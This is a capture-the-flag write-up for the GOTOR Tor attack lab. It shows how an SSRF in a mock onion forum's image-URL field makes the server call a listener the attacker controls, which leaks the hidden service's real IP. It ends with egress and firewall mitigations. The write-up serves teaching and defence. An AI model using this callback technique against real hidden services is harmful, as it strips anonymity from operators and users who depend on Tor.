---
title: "GOTOR - Web misconfiguration - Leaking a Hidden Service's Real IP with an SSRF"
date: 2026-10-29
categories: [GOTOR]
tags: [GOTOR]
media_subpath: /assets/img/
image:
  path: webconf_site.png
  alt: The onion forum selling 0-days
---

## GOTOR

> This is a writeup for one of the attacks in **GOTOR**, a self-hosted lab for practising attacks against Tor. The lab is available [on GitHub](https://github.com/NiBi8z/GOTOR).
{: .prompt-tip }

For this first challenge, we get the onion link from the CTF-board page. The goal is to recover the IP address of the server hosting this onion service.

![The challenge goal](web_misconfgoal.png)

## Setting up the browser

First, let's configure our web browser to access this onion link. I'm using Firefox.

In `about:config`, set `network.dns.blockDotOnion` to `false` so Firefox stops blocking `.onion` name resolution.

Then point Firefox at Tor's local SOCKS v5 proxy, which listens on `127.0.0.1:9050` in GOTOR.

![Firefox proxy setup](proxysetup.png)

We can now browse the `.onion` address given on the CTF-board.

![The rendered site](webconf_site.png)

We discover a forum selling 0-days.

## Finding the SSRF

There isn't much of interest on the site apart from a "Sell" button.

It lets us post an offer: we just fill in the fields and our listing goes live. The "Product photo URL" field comes with the note *"We download it server-side to cache it on our CDN."*

That means the server will fetch our image to cache it. This is a textbook **Server-Side Request Forgery (SSRF)**: we can coerce the server into making a request to an arbitrary host of our choosing.

Since the containers aren't connected to the internet, we'll spin up a listener on the same network, then post a sale listing with our own server's URL in the photo field.

Let's start our listener. I'm using a lightweight image that already ships with `ip` and `python3`:

```bash
➜  GOTOR git:(main) ✗ podman run -it --rm --name listener --network gotor docker.io/library/python:3-alpine sh
Trying to pull docker.io/library/python:3-alpine...
Getting image source signatures
Copying blob a30f13ed6871 done   |
Copying blob 9e0270056964 done   |
Copying blob 1c9cc35ec380 done   |
Copying config e83649b999 done   |
Writing manifest to image destination
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0@if33: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 65520 qdisc noqueue state UP qlen 1000
    link/ether 76:3d:1e:48:5f:ae brd ff:ff:ff:ff:ff:ff
    inet 10.44.0.15/16 brd 10.44.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::743d:1eff:fe48:5fae/64 scope link
       valid_lft forever preferred_lft forever
/ # python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Now we just create an offer whose photo URL points at our web server, here, `http://10.44.0.15:8000/pic.png`.

And on our web server we receive:

```bash
10.44.4.73 - - [29/Oct/2026 12:43:34] code 404, message File not found
10.44.4.73 - - [29/Oct/2026 12:43:34] "GET /pic.png HTTP/1.1" 404 -
```

The server backing the `.onion` came to fetch our image and, in doing so, leaked its IP: **`10.44.4.73`**.

## Conclusion

For a hidden service, an SSRF is a **critical** vulnerability: it directly leaks the IP of the machine hosting the `.onion`, which defeats the entire anonymity guarantee Tor is supposed to provide.

Tor offers no protection against this by design. Tor only anonymizes *inbound* connections to a hidden service: it hides the server's location from the clients that connect to it. It does nothing to constrain *outbound* traffic the application itself initiates. When the backend makes a direct `GET` request to an attacker-controlled host, that connection leaves through the server's normal network interface, not through Tor, so the destination sees the real source IP. The hidden service descriptor never contains the IP, but any server-side fetch, DNS lookup, webhook, or error-reporting call that bypasses Tor can reveal it.

To protect against this, the operator should:

- **Force all outbound traffic through Tor** (e.g. with a transparent proxy / Tor `TransPort`, or by running the service on a gateway like Whonix) so that even an SSRF cannot reach a host directly over clearnet.
- **Drop non-Tor egress at the firewall** : a default-deny outbound policy that only allows traffic to the local Tor daemon means a leaked request simply fails instead of exposing the IP.
- **Avoid server-side fetching of user-supplied URLs** altogether; if it's truly needed, validate and allow-list the targets, block internal ranges and link-local/metadata addresses, and fetch through the Tor SOCKS proxy.
